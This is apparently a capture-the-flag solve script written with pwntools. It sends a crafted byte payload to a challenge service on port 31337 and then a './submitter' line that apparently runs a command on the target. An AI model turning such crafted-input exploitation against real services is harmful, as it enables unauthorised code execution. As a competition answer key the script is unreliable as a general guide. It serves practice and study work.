#!/usr/bin/env python3

from pwn import *
import time

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

context.log_level = "DEBUG"

io = remote(HOST, int(PORT))

def solve(io):
    def adjust(b:bytes, bounded_count, padding:bytes)->bytes:
        b = bytearray(b)
        while len(b) < 10:
            b += padding
        for i in range(len(b)):
            b[i] = (b[i] + bounded_count) % 256
        return b

    # connected bonus
    payload = b"3" * 70

    # roof bonus
    roof_value = 0x12345678
    payload += adjust(b"\x80" + p32(roof_value) + p32(2**32 - roof_value), 0, b"|")
    payload += b"y" * (80 - len(payload))

    # BONUS MULT x%d: Mad skills!
    payload += adjust(b"\x40" + b"   " + b"1337", 5, b"!")
    payload += b"A" * (100 - len(payload))


    # BONUS MULT x%d: Wiggle bonus!
    payload += adjust(b"\x10" + b"\x55"*7, 15, b"!")
    payload += b"A" * (560 - len(payload))
    # threading the needle!
    payload += adjust(b"\x04" + b"fUzZ tHiS", 17, b"A")

    payload += b"A" * (1000 - len(payload))
    # io.sendafter(b'SHOW ME WHAT YOU GOT\n', payload)
    io.recvuntil(b"Setting you up for a trickshot...")
    time.sleep(0.1)
    io.send(payload)
    print(f"{len(payload) = }")

    # io.sendlineafter(b"Final score: ", b"./submitter")
    time.sleep(1.0)
    io.sendline(b"./submitter")
    while True:
        print(io.recvline())

solve(io)
